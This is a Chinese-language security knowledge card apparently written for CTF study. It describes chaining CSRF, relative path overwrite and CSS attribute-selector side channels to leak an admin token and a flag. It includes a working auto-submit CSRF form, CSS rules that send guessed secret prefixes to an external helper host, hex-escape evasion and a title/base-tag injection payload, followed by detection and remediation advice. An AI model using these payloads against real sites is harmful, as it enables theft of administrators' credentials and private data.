---
id: web-generic-csrf-rpo-css-selector-side-channel
title: CSRF + RPO + CSS 选择器侧信道窃取管理员 Token 与 Flag
type: scenario
domain: web
path: web/generic/csrf
technique: csrf-rpo-css-selector-side-channel
aliases:
- CSRF 写 CSS
- RPO CSS 侧信道
- CSS 属性选择器外带
- urlstorage
- 管理员 token 泄露
tags:
- csrf
- rpo
- relative-path-overwrite
- css-injection
- css-selector
- side-channel
- admin-bot
- token-leak
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V5
  verified_at: '2026-11-04T21:35:19+08:00'
  notes: 已对照原文核对；CTF 组合链，原文已完整跑通 token 爆破与 flag 前缀读取，PoC/CSS 选择器/hex escape/模板注入均与原文一致；未在本地复现 PoC
---

## 一句话结论

当站点允许当前用户把自己的 CSS 存进 profile、又用前缀路由把 `/urlstorage/anything` 都映射到同一个 HTML 页面时，攻击者可用 CSRF 让管理员浏览器把恶意 CSS 写进管理员自己的 profile，再用 RPO 让该 HTML 在 CSS 上下文里被解析；CSS 属性选择器逐字符判断 secret 前缀，命中后通过 `background:url(...)` 向公网 helper 回连，从而先枚举管理员 token，再带 token 读取 flag。

## 原理

- **状态归属**：`/urlstorage/` 保存的是“当前登录用户”的 profile 内容，不是全局 CSS。攻击者自己 POST 只会写自己的 profile；必须让管理员浏览器带着 admin cookie 去 POST，才能把 CSS 写进管理员 profile。`/contact` 的机器人正好提供了这个入口。
- **CSRF 写入**：攻击者在公网 trigger 页面放一个自动提交的表单，`action` 指向目标站 `/urlstorage/`，字段 `url` 填入 CSS。管理员浏览器打开 trigger 后自动 POST，CSS 落入管理员 profile。
- **RPO（Relative Path Overwrite）**：目标路由用前缀匹配（如 `^urlstorage`），`/urlstorage`、`/urlstorage/rpoooo`、`/urlstorage/anything` 都返回同一个页面。页面里保存的 CSS 文本会随 HTML 一起返回；当浏览器在 CSS 加载上下文请求 `/urlstorage/rpoooo` 时，响应虽然带 `text/html`，浏览器仍会按 CSS 解析，攻击者保存的 CSS 规则因此生效。
- **CSS 选择器侧信道**：CSS 不能读取 DOM 值，但可以条件匹配。`input[value^="CTF2{9"] { background: url("https://helper/raw2/CTF2%7B9") }` 在页面存在匹配值时触发背景图请求；helper 收到请求即知道该前缀命中。泄露的是“候选是否匹配”，不是 DOM 内容本身。
- **逐字符枚举**：token 是 32 位 hex，每轮生成 256 条规则（两位 hex 的所有组合），命中后推进两位，16 轮即可读完；CSS 体积与轮数的权衡取决于管理员停留时间。
- **阶段二**：拿到完整 token 后访问 `/flag?token=<admin_token>`。若模板把 token 以 `|safe` 放进 `<title>`，可注入 `</title><base href="/urlstorage/rpoooo/">`，让 flag 页面也加载 RPO CSS；再用 `#flag[value^="..."]` 枚举 flag。
- 三层叠加的关键是“谁在访问、状态属于谁、响应在什么上下文被解析、命中后哪个资源请求回到 helper”。任何一层假设错误都会表现为“token 能爆但 flag 不涨”。

## 触发条件

- 站点有管理员机器人（`/contact` 等）会带 admin cookie 打开攻击者提交的 URL。
- 存在按用户存储、且在页面中回显的 CSS/文本字段（profile、主题、自定义样式等），写入接口缺少 CSRF 防护。
- 路由使用前缀匹配，任意后缀都返回同一页面（RPO 条件）；该页面在浏览器中能被当作 CSS 加载。
- 目标页面把 secret 放在可被 CSS 属性选择器匹配的属性里（`value`、`href` 等）。
- 管理员浏览器允许加载外部图片/资源（CSP 未完全阻断 `img-src`/`background`）。
- 阶段二还需要 flag 页面存在 HTML 注入点（如 `|safe`）或其它方式加载 RPO CSS。

## 利用步骤

1. 探测目标：确认 `/contact` 机器人、`/urlstorage` 写入接口、`/flag` 校验逻辑与路由前缀行为。
2. 搭建公网 helper：返回 trigger 页面、按轮生成 CSS、接收 `/new1`、`/raw2`、`/probe2` 回连、展示状态。
3. 构造 trigger：自动 POST 表单到 `http://127.0.0.1/urlstorage/`，`url` 字段放 CSS；把 trigger 地址提交到 `/contact`。
4. 验证 RPO：让管理员访问 `/urlstorage/rpoooo`，确认页面在 CSS 上下文被解析，且保存的 CSS 生效。
5. 阶段一：CSS 用 `a[href^="flag?token=<guess>"]` 匹配 token 链接，每轮 256 条规则，命中后推进两位，直到 32 位 token 完整。
6. 阶段二：访问 `/flag?token=<admin_token>`；若模板可注入，带上 `</title><base href="/urlstorage/rpoooo/">` 让 flag 页加载 RPO CSS。
7. 用 `#flag[value^="<prefix><candidate>"]` 枚举 flag 前缀，直到 `}` 或题目要求的长度。
8. 按断点排查：stage2 是否打开、CSS 是否保存、flag 页是否加载 RPO CSS、token 是否仍有效、selector 是否匹配真实格式。

## PoC

```html
<!-- trigger：管理员浏览器带 admin cookie 自动 POST，把 CSS 写进管理员 profile -->
<form id="f" method="POST" action="http://127.0.0.1/urlstorage/" target="sink">
  <textarea name="url">
a[href^="flag?token=00"]{background:url("https://helper/new1/00")}
a[href^="flag?token=01"]{background:url("https://helper/new1/01")}
/* ... 共 256 条，覆盖 00-ff ... */
  </textarea>
</form>
<iframe name="sink" hidden></iframe>
<script>f.submit(); setTimeout(()=>location.href="http://127.0.0.1/urlstorage/rpoooo", 800);</script>
```

```css
/* 阶段一：按 token 前缀匹配 <a href="flag?token=..."> */
a[href^="flag?token=be9d"]{background:url("https://helper/new1/be9d")}

/* 也可用 CSS hex escape 规避 ?、= 等字符的解析问题 */
a[href^=\66\6c\61\67\3f\74\6f\6b\65\6e\3dbe9d]{background:url("https://helper/new1/be9d")}
```

```css
/* 阶段二：flag 页面注入 <base> 后，匹配 #flag[value] */
#flag[value^="CTF2{96"]{background:url("https://helper/raw2/CTF2%7B96")}
```

命中判定：helper 收到对应候选的请求即该前缀为真；每轮只保留命中的候选，追加下一位/下一字节继续。

## 变体与关联

- token 会随管理员会话/运行轮次变化，flag 在同一实例内通常是静态的。token 失效时只清 token，不要清已读到的 flag 前缀；否则会出现“读到 21 位后又从 0 开始”。
- 不要硬编码官方 writeup 的前缀（如 `34C3_<40 hex>`）；先用 `input[value^="3"]`、`input[value^="C"]`、`input[value^="CTF2{"]` 等格式探针确认真实前缀，再决定字符集。
- 枚举粒度：hex token 两位一轮（256 条规则）通常比一位一轮（16 条 × 32 轮）更省管理员时间；uuid-like flag 字符集大，两位会爆炸（65×65），应一位一轮或先收窄字符集。
- CSS 属性优先用稳定的 `background:url(...)`；复杂兄弟选择器、`border-image` 在不同环境可能不触发资源加载。
- 排障断点：`body`/`input` 探针确认 CSS 被解析；`b` 探针判断是否进入 invalid-token 分支；`#flag[value]` 探针确认有效 flag 分支。
- 关联：`[[web-generic-xss-scriptless-execution-vectors]]` 是不依赖 `<script>` 的客户端执行载体；本卡是不依赖脚本执行、仅靠 CSS 条件匹配与资源加载的泄露通道；`[[web-generic-cache-poisoning-web-cache-deception-url-normalization-mismatch]]` 同样利用“同一 URL 在不同上下文被不同解析”的错位。

## 检测与防御

- 检测：`/contact` 等机器人入口提交的 URL 指向外部 helper；短时间内管理员会话出现大量对 `/urlstorage/<随机后缀>` 的请求。
- 检测：profile 页面出现含 `background:url(http...)`、`@import`、属性选择器（`[value^=]`、`[href^=]`）的 CSS；外部图片请求携带疑似 secret 前缀。
- 检测：flag 页面出现 `</title>`、`<base` 等注入痕迹；同一管理员 token 被用于异常来源的 `/flag` 请求。
- 修复（CSRF）：所有状态变更接口加 CSRF Token/SameSite；机器人提交的 URL 不应让管理员在目标站执行写操作。
- 修复（存储型 CSS）：不要把用户可控 CSS 存进其他用户会访问的 profile 并原样回显；如必须允许自定义样式，做严格白名单/沙箱域名隔离，禁止 `url()` 外链。
- 修复（RPO）：私有路由使用精确匹配或规范化后校验，拒绝 `/urlstorage/任意后缀` 命中同一私有页面；对 HTML 响应设置正确的 `Content-Type` 与 `X-Content-Type-Options: nosniff`，避免被当 CSS 解析。
- 修复（HTML 注入）：模板中对 token 等参数做上下文相关转义，禁止 `|safe`；对 `<title>` 内的用户输入做 HTML 转义。
- 加固：CSP 限制 `img-src`/`style-src`/`connect-src`，禁止加载任意外部资源；敏感值不要放在可被 CSS 选择器匹配的属性中；管理员机器人使用独立低权限会话并限制可访问目标。
